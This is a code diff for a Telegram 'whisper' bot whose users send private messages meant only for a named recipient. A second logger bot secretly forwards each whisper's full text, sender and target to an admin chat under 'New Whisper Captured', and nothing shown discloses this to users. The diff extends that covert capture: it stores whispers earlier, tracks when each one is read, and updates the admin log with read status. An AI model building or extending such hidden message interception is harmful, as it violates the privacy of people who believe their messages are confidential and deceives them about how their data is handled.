@@ -5,6 +5,7 @@ import secrets
 import time
 import aiosqlite
 from aiogram import Bot, Dispatcher, types
+from aiogram.exceptions import TelegramAPIError
 from aiogram.filters import Command, CommandObject
 
 # 🔑 CONFIGURATION
@@ -16,7 +17,7 @@ BOT_USERNAME      = "Psstlongbot"
 if not WHISPER_BOT_TOKEN or not LOGGER_BOT_TOKEN:
     raise RuntimeError("Set the WHISPER_BOT_TOKEN and LOGGER_BOT_TOKEN environment variables.")
 
-DB_PATH = "whispers.db"
+DB_PATH = os.getenv("DB_PATH", "whispers.db")
 logger = logging.getLogger(__name__)
 
 # Initialize Bots
@@ -34,29 +35,84 @@ async def init_db():
                 sender_username TEXT,
                 target_username TEXT,
                 secret_text TEXT,
-                expires_at INTEGER
+                expires_at INTEGER,
+                status TEXT NOT NULL DEFAULT 'unread',
+                read_at INTEGER,
+                logger_message_id INTEGER
             )
         ''')
+        async with db.execute("PRAGMA table_info(whispers)") as cursor:
+            columns = {row[1] for row in await cursor.fetchall()}
+        for column, definition in (
+            ("status", "TEXT NOT NULL DEFAULT 'unread'"),
+            ("read_at", "INTEGER"),
+            ("logger_message_id", "INTEGER"),
+        ):
+            if column not in columns:
+                await db.execute(f"ALTER TABLE whispers ADD COLUMN {column} {definition}")
         await db.commit()
 
 # 📡 BOT 2: LOGGER FUNCTION
-async def log_to_admin(sender_user, target, text):
+def format_log_message(sender_user, target, text, status, continued=False):
     sender_display = f"@{sender_user}" if isinstance(sender_user, str) else str(sender_user)
+    if continued:
+        return f"Content (continued):\n{text}"
     header = (
         "New Whisper Captured\n\n"
         f"From: {sender_display}\n"
         f"To: {target}\n"
+        f"Status: {status}\n"
         "Content:\n"
     )
-    chunks = [text[index:index + 1800] for index in range(0, len(text), 1800)] or [""]
+    return f"{header}{text}"
 
+
+def split_text(text, chunk_size=1800):
+    return [text[index:index + chunk_size] for index in range(0, len(text), chunk_size)] or [""]
+
+
+async def log_to_admin(sender_user, target, text, status="Unread"):
+    chunks = split_text(text)
+    first_message_id = None
     try:
         for index, chunk in enumerate(chunks):
-            prefix = header if index == 0 else "Content (continued):\n"
-            await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=f"{prefix}{chunk}")
+            log_message = format_log_message(
+                sender_user, target, chunk, status, continued=index > 0
+            )
+            sent_message = await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message)
+            if index == 0:
+                first_message_id = sent_message.message_id
     except Exception:
         logger.exception("Failed to deliver whisper log to admin chat %s", ADMIN_CHAT_ID)
         raise
+    return first_message_id
+
+
+async def update_log_status(whisper_id):
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute(
+            "SELECT sender_username, target_username, secret_text, logger_message_id "
+            "FROM whispers WHERE whisper_id = ?",
+            (whisper_id,)
+        ) as cursor:
+            row = await cursor.fetchone()
+
+    if not row or not row[3]:
+        return
+
+    sender_username, target_username, secret_text, logger_message_id = row
+    first_chunk = split_text(secret_text)[0]
+    updated_message = format_log_message(
+        sender_username or "unknown", target_username, first_chunk, "Read"
+    )
+    try:
+        await bot2.edit_message_text(
+            chat_id=ADMIN_CHAT_ID,
+            message_id=logger_message_id,
+            text=updated_message
+        )
+    except TelegramAPIError:
+        logger.exception("Failed to update read status for whisper %s", whisper_id)
 
 # 🚀 BOT 1: INLINE QUERY HANDLER (In Groups)
 @dp.inline_query()
@@ -83,6 +139,23 @@ async def inline_handler(inline_query: types.InlineQuery):
     whisper_id = secrets.token_urlsafe(8)
     
     if whisper_text:
+        expires_at = int(time.time()) + 86400
+        async with aiosqlite.connect(DB_PATH) as db:
+            await db.execute(
+                "INSERT INTO whispers "
+                "(whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) "
+                "VALUES (?, ?, ?, ?, ?, ?)",
+                (
+                    whisper_id,
+                    sender.id,
+                    sender.username,
+                    target_username,
+                    whisper_text,
+                    expires_at
+                )
+            )
+            await db.commit()
+
         # Fixed Link Format: Absolute pathing forces native app opening
         redirect_url = f"https://t.me/{BOT_USERNAME}?start={whisper_id}"
         input_content = types.InputTextMessageContent(
@@ -114,35 +187,44 @@ async def inline_handler(inline_query: types.InlineQuery):
     # cache_time=0 forces the client to dynamically look up inputs character by character
     await inline_query.answer([item], cache_time=0, is_personal=True)
 
-# 📥 BOT 1: CHOSEN INLINE RESULT HANDLER (Saves and Logs exactly ONCE when tapped)
+# Enable inline feedback for this bot in BotFather so Telegram reports selected results.
 @dp.chosen_inline_result()
 async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
     whisper_id = chosen_result.result_id
-    text = chosen_result.query.strip()
-    
-    parts = text.split(" ", 1)
-    if len(parts) < 2:
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute(
+            "SELECT sender_username, target_username, secret_text, logger_message_id, status "
+            "FROM whispers WHERE whisper_id = ?",
+            (whisper_id,)
+        ) as cursor:
+            row = await cursor.fetchone()
+
+    if not row:
+        logger.warning("Selected whisper %s was not found in the database", whisper_id)
         return
-        
-    target_username = parts[0]
-    whisper_text = parts[1].strip()
-    
-    if not whisper_text:
+    sender_username, target_username, whisper_text, logger_message_id, status = row
+    if logger_message_id:
         return
-        
-    sender = chosen_result.from_user
-    expires_at = int(time.time()) + 86400  # 24 hours from now
-    
-    # Perform the database write once
+
+    first_log_message_id = await log_to_admin(
+        sender_username or chosen_result.from_user.id,
+        target_username,
+        whisper_text,
+        status="Read" if status == "read" else "Unread"
+    )
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute(
-            "INSERT OR REPLACE INTO whispers (whisper_id, sender_id, sender_username, target_username, secret_text, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
-            (whisper_id, sender.id, sender.username, target_username, whisper_text, expires_at)
+            "UPDATE whispers SET logger_message_id = ? WHERE whisper_id = ?",
+            (first_log_message_id, whisper_id)
         )
+        async with db.execute(
+            "SELECT status FROM whispers WHERE whisper_id = ?",
+            (whisper_id,)
+        ) as cursor:
+            latest_status = await cursor.fetchone()
         await db.commit()
-        
-    # Perform the log send once (Bypasses rate limits completely)
-    await log_to_admin(sender.username or sender.id, target_username, whisper_text)
+    if latest_status and latest_status[0] == "read":
+        await update_log_status(whisper_id)
 
 # 📥 BOT 1: START HANDLER (welcome + deep links)
 @dp.message(Command("start"))
@@ -176,10 +258,18 @@ async def handle_start(message: types.Message, command: CommandObject):
 
         clean_target = target_username.lstrip('@').lower()
         if current_user.lower() == clean_target:
-            await message.answer(
-                f"📩 **Your Secret Whisper:**\n\n`{secret_text}`",
-                parse_mode="Markdown"
-            )
+            async with aiosqlite.connect(DB_PATH) as db:
+                await db.execute(
+                    "UPDATE whispers SET status = 'read', read_at = COALESCE(read_at, ?) "
+                    "WHERE whisper_id = ?",
+                    (int(time.time()), whisper_id)
+                )
+                await db.commit()
+            await update_log_status(whisper_id)
+            chunks = split_text(secret_text)
+            await message.answer(f"Your Secret Whisper:\n\n{chunks[0]}")
+            for chunk in chunks[1:]:
+                await message.answer(f"Continued:\n\n{chunk}")
         else:
             await message.answer("❌ This whisper was not sent to your username!")
         return
@@ -259,7 +349,8 @@ async def back_callback(callback: types.CallbackQuery):
 # ⚙️ MAIN EXECUTION LOOP
 async def main():
     await init_db()
-    print("Bots are starting...")
+    logging.basicConfig(level=logging.INFO)
+    logger.info("Bots are starting...")
     try:
         await dp.start_polling(bot1)
     finally:
